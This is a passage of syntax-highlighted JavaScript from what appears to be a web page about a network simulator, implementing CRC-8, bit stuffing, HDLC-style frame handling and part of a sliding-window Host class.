class="line">            crc = crc &amp; <span class="number">0x80</span> ? crc &lt;&lt; <span class="number">1</span> ^ POLY : crc &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (crc ^ XOROUT) &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BitStuffing</span>(<span class="params">binArr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> stuffed = [];</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; binArr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (binArr[i] == <span class="number">1</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        stuffed.push(binArr[i]);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">5</span>) &#123;</span><br><span class="line">            stuffed.push(<span class="number">0</span>);</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stuffed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BitDestuffing</span>(<span class="params">binArr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> destuffed = [];</span><br><span class="line">    <span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; binArr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (binArr[i] == <span class="number">1</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        destuffed.push(binArr[i]);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">5</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> destuffed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FrameHelper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">CheckFrame</span>(<span class="params">frame</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Check if the frame is valid</span></span><br><span class="line">        <span class="comment">// frame: binary array</span></span><br><span class="line">        <span class="comment">// return: boolean</span></span><br><span class="line">        <span class="keyword">if</span> (frame.slice(<span class="number">0</span>, <span class="number">8</span>).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span> || frame.slice(-<span class="number">8</span>).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> payload = BitDestuffing(frame.slice(<span class="number">8</span>, -<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> crc = payload.slice(-<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">var</span> crcCal = crc8(bin2bytes(payload.slice(<span class="number">0</span>, -<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crcCal != bin2bytes(crc)[<span class="number">0</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">MakeFrame</span>(<span class="params">destination, source, seq, byteData, type = FrameType.Data</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// return: binary array</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (destination &gt; <span class="number">3</span> || destination &lt; <span class="number">0</span> || source &gt; <span class="number">3</span> || source &lt; <span class="number">0</span> || seq &gt; <span class="number">15</span> || seq &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&quot;Invalid destination, source or sequence&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (byteData.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&quot;Data cannot be empty&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (type &gt; FrameType.MAX || type &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&quot;Invalid frame type&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> frame = [];</span><br><span class="line">        <span class="keyword">var</span> flag = bytes2bin(<span class="number">0x7E</span>)</span><br><span class="line">        <span class="keyword">var</span> control = [type, (destination &lt;&lt; <span class="number">6</span>) | (source &lt;&lt; <span class="number">4</span>) | seq];</span><br><span class="line">        <span class="keyword">var</span> binData = bytes2bin(byteData);</span><br><span class="line">        <span class="keyword">if</span> (binData.length &lt; <span class="number">8</span>)</span><br><span class="line">            binData = <span class="built_in">Array</span>(<span class="number">8</span> - binData.length).fill(<span class="number">0</span>).concat(binData);</span><br><span class="line">        <span class="keyword">var</span> crc = crc8(control.concat(byteData));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> payload = bytes2bin(control).slice(<span class="number">7</span>).concat(binData).concat(bytes2bin(crc));</span><br><span class="line">        payload = BitStuffing(payload);</span><br><span class="line"></span><br><span class="line">        frame = frame.concat(flag);</span><br><span class="line">        frame = frame.concat(payload);</span><br><span class="line">        frame = frame.concat(flag);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> frame;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">MakeFrameFromeText</span>(<span class="params">destination, source, startSeq, text, maxFrameSize</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// return: 2D array, each element is a binary array frame</span></span><br><span class="line">        <span class="keyword">var</span> frames = [];</span><br><span class="line">        <span class="keyword">var</span> data = str2bytes(text);</span><br><span class="line">        <span class="keyword">var</span> seq = startSeq;</span><br><span class="line">        <span class="keyword">var</span> maxDataSize = maxFrameSize - <span class="number">33</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += maxDataSize) &#123;</span><br><span class="line">            <span class="keyword">var</span> frameData = data.slice(i, i + maxDataSize);</span><br><span class="line">            frames.push(FrameHelper.MakeFrame(destination, source, seq, frameData));</span><br><span class="line">            seq = (seq + <span class="number">1</span>) % <span class="number">16</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> frames;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">ExtractFrame</span>(<span class="params">frame, checkFrame = <span class="literal">true</span></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Extract the frame into destination, source, sequence and data</span></span><br><span class="line">        <span class="comment">// frame: binary array</span></span><br><span class="line">        <span class="comment">// return: object &#123;destination, source, sequence, data&#125;</span></span><br><span class="line">        <span class="keyword">if</span> (checkFrame &amp;&amp; !FrameHelper.CheckFrame(frame))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> payload = BitDestuffing(frame.slice(<span class="number">8</span>, -<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> type = payload[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> destination = bin2bytes(payload.slice(<span class="number">1</span>, <span class="number">3</span>))[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> source = bin2bytes(payload.slice(<span class="number">3</span>, <span class="number">5</span>))[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> sequence = bin2bytes(payload.slice(<span class="number">5</span>, <span class="number">9</span>))[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> data = bin2bytes(payload.slice(<span class="number">9</span>, -<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            type: type,</span><br><span class="line">            destination: destination,</span><br><span class="line">            source: source,</span><br><span class="line">            sequence: sequence,</span><br><span class="line">            data: data</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">DisplayFrameInText</span>(<span class="params">frame, split = <span class="string">&quot;&lt;br&gt;&quot;</span>, end = <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span></span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Display the frame in text</span></span><br><span class="line">        <span class="comment">// frame: binary array</span></span><br><span class="line">        <span class="comment">// return: string</span></span><br><span class="line">        <span class="keyword">var</span> frameObj = FrameHelper.ExtractFrame(frame);</span><br><span class="line">        <span class="keyword">if</span> (frameObj == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (frameObj.type == FrameType.Control) &#123;</span><br><span class="line">            <span class="keyword">if</span> (frameObj.data[<span class="number">0</span>] == <span class="number">0x01</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot; x Sequence: &quot;</span> + frameObj.sequence + split + <span class="string">&quot;ACK Frame&quot;</span> + end;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (frameObj.data[<span class="number">0</span>] == <span class="number">0x00</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot; x Sequence: &quot;</span> + frameObj.sequence + split + <span class="string">&quot;NAK Frame&quot;</span> + end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; @ Sequence: &quot;</span> + frameObj.sequence + split + <span class="string">&quot; + Data: &quot;</span> + bytes2str(frameObj.data).slice(<span class="number">0</span>, <span class="number">25</span>) + (bytes2str(frameObj.data).length &gt; <span class="number">25</span> ? <span class="string">&quot; ... &quot;</span> : <span class="string">&quot;&quot;</span>) + end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="function"><span class="title">FrameFinder</span>(<span class="params">buffer, minFrLen</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// Find the first frame in the buffer by searching for the flags</span></span><br><span class="line">        <span class="comment">// buffer: binary array</span></span><br><span class="line">        <span class="comment">// return: &#123;first frame in the buffer, start, end&#125; or null</span></span><br><span class="line">        <span class="keyword">if</span> (buffer.length &lt; minFrLen)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the start of the frame</span></span><br><span class="line">        <span class="keyword">var</span> start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (</span><br><span class="line">            buffer.slice(start, start + <span class="number">8</span>).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span> &amp;&amp;</span><br><span class="line">            start + minFrLen &lt; buffer.length</span><br><span class="line">        )</span><br><span class="line">            start++;</span><br><span class="line">        <span class="keyword">if</span> (start + minFrLen &gt; buffer.length || buffer.slice(start, start + <span class="number">8</span>).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the end of the frame</span></span><br><span class="line">        <span class="keyword">var</span> end = buffer.length;</span><br><span class="line">        <span class="keyword">while</span> (</span><br><span class="line">            buffer.slice(end - <span class="number">8</span>, end).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span> &amp;&amp;</span><br><span class="line">            end - minFrLen &gt; start</span><br><span class="line">        )</span><br><span class="line">            end--;</span><br><span class="line">        <span class="keyword">if</span> (end - minFrLen &lt; start || buffer.slice(end - <span class="number">8</span>, end).join(<span class="string">&quot;&quot;</span>) != <span class="string">&quot;01111110&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            frame: buffer.slice(start, end),</span><br><span class="line">            start: start,</span><br><span class="line">            end: end</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><div class='spoiler collapsed'>    <div class='spoiler-title'>        Host Class    </div>    <div class='spoiler-content'>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Host</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">simulator, id, UpperLayerFunc = () =&gt; &#123; <span class="keyword">return</span>; &#125;</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sim = simulator;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.UpperLayerFunc = UpperLayerFunc;</span><br><span class="line">        <span class="built_in">this</span>.tickFlag = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.ui = <span class="literal">null</span>;</span><br><span class="line">        <span class="built_in">this</span>.sendingFrame = <span class="literal">false</span>;</span><br><span class="line">        <span class="built_in">this</span>.tickCnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.sentBitCnt = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.processedBitCnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.receiveBinBuffer = []; <span class="comment">// binary array</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.sendWinSeq = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.frameSender = [];</span><br><span class="line">        <span class="comment">// array of &#123;frame, receiverID, binIndex, sequence, feedback, controlFrame, timeout, status&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.receiveFrameBuffer = <span class="built_in">Array</span>(<span class="built_in">this</span>.sim.para.winLen).fill(<span class="literal">null</span>);</span><br><span class="line">        <span class="built_in">this</span>.receiveWinSeq = <span class="number">0</span>; <span class="comment">// sequence number of the first frame in the receive window</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.sim.hostList.push(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.Ticker = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.tickFlag)</span><br><span class="line">                <span class="built_in">this</span>.Tick();</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; is still ticking&quot;</span>)</span><br><span class="line">        &#125;, <span class="built_in">this</span>.sim.para.tick);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">Tick</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.tickFlag = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">this</span>.SendListener();</span><br><span class="line">        <span class="built_in">this</span>.ReceiveListener();</span><br><span class="line">        <span class="built_in">this</span>.tickCnt++;</span><br><span class="line">        <span class="built_in">this</span>.tickFlag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">PushToReceiveFrameBuffer</span>(<span class="params">extractedFrame</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// push the extracted frame to the receive frame buffer</span></span><br><span class="line">        <span class="keyword">var</span> sequence = extractedFrame.sequence;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> distance = <span class="built_in">Math</span>.min((<span class="built_in">this</span>.receiveWinSeq - sequence + <span class="built_in">this</span>.sim.para.seq) % <span class="built_in">this</span>.sim.para.seq, (sequence - <span class="built_in">this</span>.receiveWinSeq + <span class="built_in">this</span>.sim.para.seq) % <span class="built_in">this</span>.sim.para.seq);</span><br><span class="line">        <span class="keyword">if</span> (distance == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.receiveFrameBuffer[<span class="number">0</span>] = extractedFrame;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> expected = []</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="built_in">this</span>.sim.para.winLen; i++)</span><br><span class="line">                expected.push((<span class="built_in">this</span>.receiveWinSeq + i) % <span class="built_in">this</span>.sim.para.seq);</span><br><span class="line">            <span class="keyword">if</span> (expected.indexOf(sequence) == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; repeated frame &quot;</span> + sequence + <span class="string">&quot; as now is already to frame &quot;</span> + <span class="built_in">this</span>.receiveWinSeq);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.receiveFrameBuffer[expected.indexOf(sequence) + <span class="number">1</span>] = extractedFrame;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;ğŸ‘‰Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; Added frame &quot;</span> + sequence + <span class="string">&quot; to receive buffer &quot;</span> + <span class="string">&quot;as &quot;</span> + expected.indexOf(sequence) + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">this</span>.receiveFrameBuffer);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.receiveFrameBuffer[<span class="number">0</span>] != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.UpperLayerFunc(<span class="built_in">this</span>.receiveFrameBuffer[<span class="number">0</span>].data);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–â–&quot;</span>)</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;ğŸ‘‡Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; Removed frame &quot;</span> + <span class="built_in">this</span>.receiveWinSeq + <span class="string">&quot; from receive buffer&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;ASCII: &quot;</span> + bytes2str(<span class="built_in">this</span>.receiveFrameBuffer[<span class="number">0</span>].data));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”â–”&quot;</span>)</span><br><span class="line">            <span class="built_in">this</span>.receiveFrameBuffer.shift();</span><br><span class="line">            <span class="built_in">this</span>.receiveFrameBuffer.push(<span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.receiveWinSeq = (<span class="built_in">this</span>.receiveWinSeq + <span class="number">1</span>) % <span class="built_in">this</span>.sim.para.seq;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;ğŸ‘€ Host &quot;</span> + <span class="built_in">this</span>.id + <span class="string">&quot; Now receive window is at &quot;</span> + <span class="built_in">this</span>.receiveWinSeq);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">HandleControlFrame</span>(<span class="params">extractedFrame</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span 